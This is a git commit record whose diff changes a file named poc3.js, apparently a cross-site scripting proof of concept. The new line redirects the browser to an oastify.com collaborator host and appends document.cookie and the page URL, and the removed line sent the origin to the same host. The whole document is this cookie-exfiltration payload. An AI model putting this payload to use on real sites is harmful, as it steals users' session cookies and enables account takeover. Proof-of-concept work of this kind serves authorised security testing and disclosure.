6da2b5d6011d015422050f3b17104392f9e2ec82
dV3920 <88095613+dV3920@users.noreply.github.com>
2025-11-06 17:55:40 +0700

    Update poc3.js

--- poc3.js
+++ poc3.js
@@ -1,1 +1,1 @@
-fetch('//3lptsh2ug2oh8d5qs47gcp94tvzmndb2.oastify.com?cookie=' + encodeURIComponent(origin) + '&url=' + encodeURIComponent(location.href), { mode: 'no-cors' });
+location='//3lptsh2ug2oh8d5qs47gcp94tvzmndb2.oastify.com?cookie='+encodeURIComponent(document.cookie)+'&url='+encodeURIComponent(location.href)
